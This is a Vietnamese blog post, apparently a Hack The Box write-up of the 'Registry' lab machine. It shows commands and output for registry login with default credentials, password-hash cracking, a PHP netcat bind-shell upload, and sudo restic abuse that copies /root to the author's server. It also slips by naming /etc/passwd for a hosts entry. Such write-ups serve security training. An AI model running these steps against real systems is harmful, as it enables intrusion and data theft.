<!doctype html><html lang=en dir=auto><head><meta charset=utf-8><meta http-equiv=x-ua-compatible content="IE=edge"><meta name=viewport content="width=device-width,initial-scale=1,shrink-to-fit=no"><meta name=robots content="index, follow"><title>[Hackthebox Writeup] Registry | minhtuanact|Blog - Keep a flame in the rain!</title><meta name=keywords content="HackTheBox,Registry,May Fest"><meta name=description content="Recon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ➜ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7."><meta name=author content="minhtuanact"><link rel=canonical href=https://minhtuanact.github.io/posts/hackthebox-writeup-registry/><meta name=google-site-verification content="minhtuanact"><meta name=yandex-verification content="minhtuanact"><meta name=msvalidate.01 content="minhtuanact"><link crossorigin=anonymous href=/assets/css/stylesheet.bc1149f4a72aa4858d3a9f71462f75e5884ffe8073ea9d6d5761d5663d651e20.css integrity="sha256-vBFJ9KcqpIWNOp9xRi915YhP/oBz6p1tV2HVZj1lHiA=" rel="preload stylesheet" as=style><script defer crossorigin=anonymous src=/assets/js/highlight.f413e19d0714851f6474e7ee9632408e58ac146fbdbe62747134bea2fa3415e0.js integrity="sha256-9BPhnQcUhR9kdOfuljJAjlisFG+9vmJ0cTS+ovo0FeA=" onload=hljs.initHighlightingOnLoad()></script>
<link rel=icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=16x16 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=icon type=image/png sizes=32x32 href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=apple-touch-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><link rel=mask-icon href=https://minhtuanact.github.io/cat-icon-png-3.png><meta name=theme-color content="#2e2e33"><meta name=msapplication-TileColor content="#2e2e33"><noscript><style>#theme-toggle,.top-link{display:none}</style><style>@media(prefers-color-scheme:dark){:root{--theme:rgb(29, 30, 32);--entry:rgb(46, 46, 51);--primary:rgb(218, 218, 219);--secondary:rgb(155, 156, 157);--tertiary:rgb(65, 66, 68);--content:rgb(196, 196, 197);--hljs-bg:rgb(46, 46, 51);--code-bg:rgb(55, 56, 62);--border:rgb(51, 51, 51)}.list{background:var(--theme)}.list:not(.dark)::-webkit-scrollbar-track{background:0 0}.list:not(.dark)::-webkit-scrollbar-thumb{border-color:var(--theme)}}</style></noscript><script type=application/javascript>var doNotTrack=!1;doNotTrack||(function(e,o,i,a,t,n,s){e.GoogleAnalyticsObject=t,e[t]=e[t]||function(){(e[t].q=e[t].q||[]).push(arguments)},e[t].l=1*new Date,n=o.createElement(i),s=o.getElementsByTagName(i)[0],n.async=1,n.src=a,s.parentNode.insertBefore(n,s)}(window,document,"script","https://www.google-analytics.com/analytics.js","ga"),ga("create","UA-123-45","auto"),ga("send","pageview"))</script><meta property="og:title" content="[Hackthebox Writeup] Registry"><meta property="og:description" content="Recon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ➜ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7."><meta property="og:type" content="article"><meta property="og:url" content="https://minhtuanact.github.io/posts/hackthebox-writeup-registry/"><meta property="og:image" content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta property="article:section" content="posts"><meta property="article:published_time" content="2020-05-01T06:55:47+07:00"><meta property="article:modified_time" content="2020-05-01T06:55:47+07:00"><meta property="og:site_name" content="minhtuanact|Blog"><meta name=twitter:card content="summary_large_image"><meta name=twitter:image content="https://minhtuanact.github.io/%3Clink%20or%20path%20of%20image%20for%20opengraph,%20twitter-cards%3E"><meta name=twitter:title content="[Hackthebox Writeup] Registry"><meta name=twitter:description content="Recon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ➜ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7."><script type=application/ld+json>{"@context":"https://schema.org","@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Posts","item":"https://minhtuanact.github.io/posts/"},{"@type":"ListItem","position":2,"name":"[Hackthebox Writeup] Registry","item":"https://minhtuanact.github.io/posts/hackthebox-writeup-registry/"}]}</script><script type=application/ld+json>{"@context":"https://schema.org","@type":"BlogPosting","headline":"[Hackthebox Writeup] Registry","name":"[Hackthebox Writeup] Registry","description":"Recon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ➜ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.","keywords":["HackTheBox","Registry","May Fest"],"articleBody":"Recon 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50  ➜ ~ ./nmapAutomator.sh 10.10.10.159 all Running a all scan on 10.10.10.159 Host is likely running Linux ---------------------Starting Nmap Quick Scan--------------------- Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07 Nmap scan report for 10.10.10.159 Host is up (0.20s latency). Not shown: 905 closed ports, 92 filtered ports Some closed ports may be reported as filtered due to --defeat-rst-ratelimit PORT STATE SERVICE 22/tcp open ssh 80/tcp open http 443/tcp open https Nmap done: 1 IP address (1 host up) scanned in 5.22 seconds ---------------------Starting Nmap Basic Scan--------------------- Starting Nmap 7.80 ( https://nmap.org ) at 2020-02-10 15:50 +07 Nmap scan report for 10.10.10.159 Host is up (0.19s latency). PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 (RSA) | 256 c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d (ECDSA) |_ 256 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 (ED25519) 80/tcp open http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site doesn't have a title. 443/tcp open ssl/http nginx 1.14.0 (Ubuntu) |_http-server-header: nginx/1.14.0 (Ubuntu) |_http-title: Site doesn't have a title. | ssl-cert: Subject: commonName=docker.registry.htb | Not valid before: 2019-05-06T21:14:35 |_Not valid after: 2029-05-03T21:14:35 Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up)![](https://images.viblo.asia/02cf4944-af7d-41c1-9dce-edb0c4fa6983.png) scanned in 28.38 seconds   Mình thấy cert có thông tin\n1  ssl-cert: Subject: commonName=docker.registry.htb   nên mình thêm vào file /etc/passwd\n1  10.10.10.159 docker.registry.htb registry.htb   Sử dụng gobuster recon thư mục\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  gobuster dir -u http://docker.registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l 40 =============================================================== Gobuster v3.0.1 by OJ Reeves (@TheColonial) \u0026 Christian Mehlmauer (@_FireFart_) =============================================================== [+] Url: http://docker.registry.htb [+] Threads: 10 [+] Wordlist: /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt [+] Status codes: 200,204,301,302,307,401,403 [+] User Agent: gobuster/3.0.1 [+] Show length: true [+] Timeout: 10s =============================================================== 2020/02/10 16:09:49 Starting gobuster =============================================================== /v2 (Status: 301) [Size: 39]   Thấy có thư mục /v2 báo mã 301 thì trang này có gắn basic auth. Thử nhập admin:admin vào thì được :v. Có lẽ auth mô phỏng lại lỗi đặt basic auth quá dễ đoán. Sau khi nhập được basic auth thì ở docker có thư mục _catalog để kiểm tra có image gì trong đấy.\nGet User Vậy là ta biết được image tên là gì rồi thì mình pull docker về xem sao.\nNhưng trong lúc mình pull docker về thì gặp lỗi này\n1 2 3  minhtuan@kali:~$ sudo docker pull docker.registry.htb/bolt-image Using default tag: latest Error response from daemon: Get https://docker.registry.htb/v2/: x509: certificate signed by unknown authority   Hóa ra là mình chưa có certificate. Vậy thì update certificate thủ công thôi Vào https://docker.registry.htb tải file .crt về copy file đấy vào\n1 2 3  /usr/local/share/ca-certificates sudo update-ca-certificates sudo service docker restart   1 2 3 4 5 6 7 8  minhtuan@kali:~$ sudo docker login https://docker.registry.htb Username: admin Password: WARNING! Your password will be stored unencrypted in /root/.docker/config.json. Configure a credential helper to remove this warning. See https://docs.docker.com/engine/reference/commandline/login/#credentials-store Login Succeeded   Thành công, lúc này ta có thể pull docker về và sử dụng bình thường rồi.\n1 2 3 4 5 6  ➜ ~ docker pull docker.registry.htb/bolt-image Using default tag: latest latest: Pulling from bolt-image Digest: sha256:eeff225e5fae33dc832c3f82fd8b0db363a73eac4f0f0cb587094be54050539b Status: Image is up to date for docker.registry.htb/bolt-image:latest docker.registry.htb/bolt-image:latest   Pull về xong rồi thì chui vào thôi\n1 2  ➜ ~ docker run --rm -it docker.registry.htb/bolt-image:latest root@9818304f783b:/#   Kinh nghiệm của mình là cứ tập trung vào những folder nào nó cực kỳ nhạy cảm như ssh, rồi mấy thư mục của user, /var/www/html xem có gì không. Lục mãi thì trong thư mục /root/.ssh có file private key ssh. Sử dụng ssh2john.py và john brute force lấy pass private key nhưng mà k được. Nên mình quay lại docker xem bên trong còn gì nữa không. Sau một hồi tìm kiếm lùng sục thì mình thấy có 1 file này ở đây.\n1 2 3 4 5 6 7 8  root@9818304f783b:/etc/profile.d# cat 01-ssh.sh #!/usr/bin/expect -f #eval `ssh-agent -s` spawn ssh-add /root/.ssh/id_rsa expect \"Enter passphrase for /root/.ssh/id_rsa:\" send \"GkOcz221Ftb3ugog\\n\"; expect \"Identity added: /root/.ssh/id_rsa (/root/.ssh/id_rsa)\" interact   Vậy đây là đoạn chương trình tạo khóa private key. Mật khẩu file id_rsa kia là GkOcz221Ftb3ugog. Việc còn lại là mình ssh vào machine thôi.\n1 2 3  ➜ registry ssh -i id_rsa root@10.10.10.159 Enter passphrase for key 'id_rsa': root@10.10.10.159's password:   K được. Cơ mà mình hơi ngây thơ, ssh vào root thì bài này đã dễ quá =)). Xong mình nhìn lại cái tên image docker là bolt-image. Thử sử dụng user ssh là bolt xem sao.\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  ➜ registry ssh -i id_rsa bolt@10.10.10.159 Enter passphrase for key 'id_rsa': Welcome to Ubuntu 18.04.3 LTS (GNU/Linux 4.15.0-65-generic x86_64) System information as of Mon Feb 10 09:35:17 UTC 2020 System load: 0.0 Users logged in: 1 Usage of /: 5.7% of 61.80GB IP address for eth0: 10.10.10.159 Memory usage: 32% IP address for br-1bad9bd75d17: 172.18.0.1 Swap usage: 0% IP address for docker0: 172.17.0.1 Processes: 173 Last login: Mon Feb 10 09:06:21 2020 from 10.10.16.7 bolt@bolt:~$ user.txt   Và chúng ta có user\nGet Root Mình sử dụng private key để đăng nhập vào ssh của bolt nên mình chưa thể sử dụng sudo right để leo thang đặc quyền được vì khi gõ sudo -l hệ thống sẽ yêu cầu nhập mật khẩu của bolt. Mình đã sử dụng LinEnum.sh để khai thác ở user bolt này nhưng chưa thu được kết quả gì. Sau một hồi tìm tòi và thử, điều khiến cho mình tập trung tiếp là vào phần web. Mình tìm thấy được trong thư mục web có thư mục /bolt.\nTrang này được tạo bởi Bolt CMS, là 1 opensource. Thử http://registry.htb/bolt/bolt thì vào được trang login. Công cuộc tiếp theo thì tìm kiếm account admin đăng nhập vào đây thôi. Lục tiếp trong folder /var/www/html/bolt thì có 1 file db.\n1 2 3 4  bolt@bolt:/var/www/html/bolt/app/database$ ls bolt.db bolt@bolt:/var/www/html/bolt/app/database$ file bolt.db bolt.db: SQLite 3.x database, last written using SQLite version 3022000   Check file thì đây là 1 file db SQLite 3. Tiếc là trên machine lại k có sqlite3 nên mình copy file này về máy để kiểm tra. Sử dụng scp để copy file bolt.db về máy mình\n1  ➜ registry scp -i id_rsa bolt@10.10.10.159:/var/www/html/bolt/app/database/bolt.db .   Sau khi đã copy xong file thì mình chui vào xem trong đó có gì, mình tìm thấy tài khoản admin ở trong bảng bolt_users\n1 2 3 4 5 6 7 8 9 10 11 12  ➜ registry sqlite3 bolt.db SQLite version 3.31.0 2019-12-29 00:52:41 Enter \".help\" for usage hints. sqlite .table bolt_authtoken bolt_field_value bolt_pages bolt_users bolt_blocks bolt_homepage bolt_relations bolt_cron bolt_log_change bolt_showcases bolt_entries bolt_log_system bolt_taxonomy sqlite select * from bolt_users ... ; 1|admin|$2y$10$e.ChUytg9SrL7AsboF2bX.wWKQ1LkS5Fi3/Z0yYD86.P5E9cpY7PK|bolt@registry.htb|2020-02-09 23:27:11|10.10.15.117|Admin|[\"themes://basic.php\",\"themes://rev.php\",\"themes://base-2018/meh.twig\",\"themes://meh.twig\",\"themes://shell.php\"]|1||||0||[\"root\",\"everyone\"] sqlite   Sử dụng john để crack passwd admin ra được passwd là strawberry, đăng nhập vào http://registry.htb/bolt/bolt. Ở đây có 1 trình upload file, ta thử upload file shell lên đây nhưng mà nó k cho upload file php lên.\nSửa 1 chút config ở đây để server cho phép upload file php\nSau đấy ta lưu lại rồi chuyển sang chức năng upload đẩy shell lên. Ban đầu mình sử dụng https://github.com/flozz/p0wny-shell nhưng mà mình k thể reverse shell lại máy mình được. Mình đã chuyển hướng sang sử dụng bind shell để RCE. Sử dụng file shell.php\n1  php system(\"nc.traditional -lvp 4444 -e /bin/bash\");   Upload lên rồi bên máy mình sử dụng lệnh\n1 2  ➜ registry nc -nv 10.10.10.159 4444 (UNKNOWN) [10.10.10.159] 4444 (?) open   Upgrade lên pty shell\n1  python -c 'import pty; pty.spawn(\"/bin/bash\")'   Đến đây rồi lại tiếp tục sử dụng LinEnum.sh để kiểm tra xem có gì không thì mình thấy cái này\n1 2 3 4 5 6  [+] We can sudo without supplying a password! Matching Defaults entries for www-data on bolt: env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin User www-data may run the following commands on bolt: (root) NOPASSWD: /usr/bin/restic backup -r rest*   Tập trung hết cơm gạo vào phần này để lấy root =)).\nGiới thiệu sơ qua một chút, restic là 1 opensource sử dụng để backup, nói rõ hơn thì mình cũng chịu vì cái này quá mới so với mình =)), chả biết gì cả.\nNgồi đọc document của nó tại đây https://restic.readthedocs.io/en/latest/ Sau một khoảng thời gian đọc doc với lên mạng tìm exam câu lệnh của nó thì mới biết là nó cần 1 server để backup. Người bạn chơi cùng mình bảo là nó có 1 restic server, nó tự động chạy trên cổng 8000. Mình ngồi tải file binary của nó ở đây https://github.com/restic/rest-server/releases\n1 2 3 4 5 6  ➜ Downloads ./rest-server-0.9.7-linux-amd64 rest-server 0.9.7 compiled with go1.10 on linux/amd64 Data directory: /tmp/restic Authentication disabled Private repositories disabled Starting server on :8000   Chạy server xong thì tạo repo restic để lưu file backup\n1 2 3 4 5 6 7 8 9  ➜ Downloads apt-get install restic ➜ Downloads restic init -r /tmp/restic enter password for new repository: enter password again: created restic repository 03ab053496 at /tmp/restic Please note that knowledge of your password is required to access the repository. Losing your password means that your data is irrecoverably lost.   Thực hiện remote port forwarding lên machine\n1  ➜ registry ssh -i id_rsa -R 8000:127.0.0.1:8000 bolt@10.10.10.159   Sử dụng restic với quyền sudo backup thư mục /root\n1 2 3 4 5 6 7 8 9 10 11 12  www-data@bolt:~/html$ sudo /usr/bin/restic backup -r rest:http://127.0.0.1:8000 /root enter password for repository: 123123 password is correct found 2 old cache directories in /var/www/.cache/restic, pass --cleanup-cache to remove them scan [/root] scanned 10 directories, 14 files in 0:00 [0:01] 100.00% 28.066 KiB / 28.066 KiB 24 / 24 items 0 errors ETA 0:00 duration: 0:01 snapshot e5ef88b3 saved www-data@bolt:~/html$   Ngon, lưu snapshot được về máy mình rồi, điều quan trọng giờ là tìm lệnh để đọc nó ra thôi. Ngồi cat mấy cái folder trong /tmp/restic mà nó mã hóa hết luôn. Ngồi đọc doc thấy đoạn này, hóa ra là nó dùng restore chứ nó k phải kiểu mở ra rồi đọc được.\n1 2 3 4  ➜ restic restic -r /tmp/restic restore e5ef88b3 --target /tmp/restic-root enter password for repository: repository 03ab0534 opened successfully, password is correct restoring [/root] at 2020-02-10 06:26:17.454661805 +0000 UTC by root@bolt to /tmp/restic-root   Xong rồi, vào /tmp/restic-root lấy cờ cuối thôi ;))\n1 2 3 4 5 6 7 8  ➜ restic cd /tmp/restic-root ➜ restic-root ;s zsh: command not found: s ➜ restic-root ls root ➜ restic-root cd root ➜ root ls config.yml cron.sh root.txt   Thanks Cảm ơn 2 thành viên trong team mình đã giúp đỡ mình trong lúc chơi ;)\n Nguyen Van Khanh B Nguyen Xuan Hoa  Hy vọng bài writeup của mình sẽ có thể giúp đỡ các bạn điều gì đó. Cảm ơn các bạn đã đọc đến đây. Mình sẽ ra những bài Writeup Hackthebox khi machine được đóng. Cùng theo dõi mình nhé.\n","wordCount":"1870","inLanguage":"en","datePublished":"2020-05-01T06:55:47+07:00","dateModified":"2020-05-01T06:55:47+07:00","author":{"@type":"Person","name":"minhtuanact"},"mainEntityOfPage":{"@type":"WebPage","@id":"https://minhtuanact.github.io/posts/hackthebox-writeup-registry/"},"publisher":{"@type":"Organization","name":"minhtuanact|Blog - Keep a flame in the rain!","logo":{"@type":"ImageObject","url":"https://minhtuanact.github.io/cat-icon-png-3.png"}}}</script></head><body id=top><script>localStorage.getItem("pref-theme")==="dark"?document.body.classList.add("dark"):localStorage.getItem("pref-theme")==="light"?document.body.classList.remove("dark"):window.matchMedia("(prefers-color-scheme: dark)").matches&&document.body.classList.add("dark")</script><header class=header><nav class=nav><div class=logo><a href=https://minhtuanact.github.io/ accesskey=h title="minhtuanact|Blog (Alt + H)"><img src=https://minhtuanact.github.io/cat-icon-png-3.png alt aria-label=logo height=35>minhtuanact|Blog</a><div class=logo-switches><button id=theme-toggle accesskey=t title="(Alt + T)"><svg id="moon" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M21 12.79A9 9 0 1111.21 3 7 7 0 0021 12.79z"/></svg><svg id="sun" xmlns="http://www.w3.org/2000/svg" width="24" height="18" viewBox="0 0 24 24" fill="none" stroke="currentcolor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><circle cx="12" cy="12" r="5"/><line x1="12" y1="1" x2="12" y2="3"/><line x1="12" y1="21" x2="12" y2="23"/><line x1="4.22" y1="4.22" x2="5.64" y2="5.64"/><line x1="18.36" y1="18.36" x2="19.78" y2="19.78"/><line x1="1" y1="12" x2="3" y2="12"/><line x1="21" y1="12" x2="23" y2="12"/><line x1="4.22" y1="19.78" x2="5.64" y2="18.36"/><line x1="18.36" y1="5.64" x2="19.78" y2="4.22"/></svg></button></div></div><ul id=menu><li><a href=https://minhtuanact.github.io/search/ title="search (Alt + /)" accesskey=/><span>search</span></a></li><li><a href=https://minhtuanact.github.io/tags/ title=tags><span>tags</span></a></li><li><a href=https://minhtuanact.github.io/wedding title=wedding><span>wedding</span></a></li></ul></nav></header><main class=main><article class=post-single><header class=post-header><div class=breadcrumbs><a href=https://minhtuanact.github.io/>Home</a>&nbsp;»&nbsp;<a href=https://minhtuanact.github.io/posts/>Posts</a></div><h1 class=post-title>[Hackthebox Writeup] Registry</h1><div class=post-meta><span title="2020-05-01 06:55:47 +0700 +0700">May 1, 2020</span>&nbsp;·&nbsp;9 min&nbsp;·&nbsp;minhtuanact</div></header><div class=toc><details><summary accesskey=c title="(Alt + C)"><span class=details>Table of Contents</span></summary><div class=inner><ul><li><a href=#recon aria-label=Recon>Recon</a></li><li><a href=#get-user aria-label="Get User">Get User</a></li><li><a href=#get-root aria-label="Get Root">Get Root</a></li><li><a href=#thanks aria-label=Thanks>Thanks</a></li></ul></div></details></div><div class=post-content><p><img loading=lazy src=https://images.viblo.asia/e1b8cdcd-9942-40c5-80e3-67bc7c276769.png alt></p><h2 id=recon>Recon<a hidden class=anchor aria-hidden=true href=#recon>#</a></h2><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span><span class=lnt>20
</span><span class=lnt>21
</span><span class=lnt>22
</span><span class=lnt>23
</span><span class=lnt>24
</span><span class=lnt>25
</span><span class=lnt>26
</span><span class=lnt>27
</span><span class=lnt>28
</span><span class=lnt>29
</span><span class=lnt>30
</span><span class=lnt>31
</span><span class=lnt>32
</span><span class=lnt>33
</span><span class=lnt>34
</span><span class=lnt>35
</span><span class=lnt>36
</span><span class=lnt>37
</span><span class=lnt>38
</span><span class=lnt>39
</span><span class=lnt>40
</span><span class=lnt>41
</span><span class=lnt>42
</span><span class=lnt>43
</span><span class=lnt>44
</span><span class=lnt>45
</span><span class=lnt>46
</span><span class=lnt>47
</span><span class=lnt>48
</span><span class=lnt>49
</span><span class=lnt>50
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>➜  ~ ./nmapAutomator.sh 10.10.10.159 all
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Running a all scan on 10.10.10.159
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Host is likely running Linux
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---------------------Starting Nmap Quick Scan---------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-02-10 15:50 +07
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.159
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.20s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>Not shown: <span class=m>905</span> closed ports, <span class=m>92</span> filtered ports
</span></span><span class=line><span class=cl>Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
</span></span><span class=line><span class=cl>PORT    STATE SERVICE
</span></span><span class=line><span class=cl>22/tcp  open  ssh
</span></span><span class=line><span class=cl>80/tcp  open  http
</span></span><span class=line><span class=cl>443/tcp open  https
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span> scanned in 5.22 seconds
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>---------------------Starting Nmap Basic Scan---------------------
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Starting Nmap 7.80 <span class=o>(</span> https://nmap.org <span class=o>)</span> at 2020-02-10 15:50 +07
</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.10.159
</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.19s latency<span class=o>)</span>.
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>PORT    STATE SERVICE  VERSION
</span></span><span class=line><span class=cl>22/tcp  open  ssh      OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 <span class=o>(</span>Ubuntu Linux<span class=p>;</span> protocol 2.0<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span> ssh-hostkey: 
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>2048</span> 72:d4:8d:da:ff:9b:94:2a:ee:55:0c:04:30:71:88:93 <span class=o>(</span>RSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>   <span class=m>256</span> c7:40:d0:0e:e4:97:4a:4f:f9:fb:b2:0b:33:99:48:6d <span class=o>(</span>ECDSA<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_  <span class=m>256</span> 78:34:80:14:a1:3d:56:12:b4:0a:98:1f:e6:b4:e8:93 <span class=o>(</span>ED25519<span class=o>)</span>
</span></span><span class=line><span class=cl>80/tcp  open  http     nginx 1.14.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: nginx/1.14.0 <span class=o>(</span>Ubuntu<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: Site doesn<span class=s1>&#39;t have a title.
</span></span></span><span class=line><span class=cl><span class=s1>443/tcp open  ssl/http nginx 1.14.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=s1>|_http-server-header: nginx/1.14.0 (Ubuntu)
</span></span></span><span class=line><span class=cl><span class=s1>|_http-title: Site doesn&#39;</span>t have a title.
</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>docker.registry.htb
</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2019-05-06T21:14:35
</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2029-05-03T21:14:35
</span></span><span class=line><span class=cl>Service Info: OS: Linux<span class=p>;</span> CPE: cpe:/o:linux:linux_kernel
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
</span></span><span class=line><span class=cl>Nmap <span class=k>done</span>: <span class=m>1</span> IP address <span class=o>(</span><span class=m>1</span> host up<span class=o>)</span>!<span class=o>[](</span>https://images.viblo.asia/02cf4944-af7d-41c1-9dce-edb0c4fa6983.png<span class=o>)</span>
</span></span><span class=line><span class=cl> scanned in 28.38 seconds
</span></span></code></pre></td></tr></table></div></div><p>Mình thấy cert có thông tin</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>ssl-cert: Subject: commonName=docker.registry.htb
</span></span></code></pre></td></tr></table></div></div><p>nên mình thêm vào file <code>/etc/passwd</code></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>10.10.10.159 docker.registry.htb registry.htb
</span></span></code></pre></td></tr></table></div></div><p>Sử dụng <code>gobuster</code> recon thư mục</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-sh data-lang=sh><span class=line><span class=cl>gobuster dir -u http://docker.registry.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l <span class=nv>40</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl>Gobuster v3.0.1
</span></span><span class=line><span class=cl>by OJ Reeves <span class=o>(</span>@TheColonial<span class=o>)</span> <span class=p>&amp;</span> Christian Mehlmauer <span class=o>(</span>@_FireFart_<span class=o>)</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Url:            http://docker.registry.htb
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Threads:        <span class=m>10</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Wordlist:       /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Status codes:   200,204,301,302,307,401,403
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> User Agent:     gobuster/3.0.1
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Show length:    <span class=nb>true</span>
</span></span><span class=line><span class=cl><span class=o>[</span>+<span class=o>]</span> Timeout:        <span class=nv>10s</span>
</span></span><span class=line><span class=cl><span class=o>===============================================================</span>
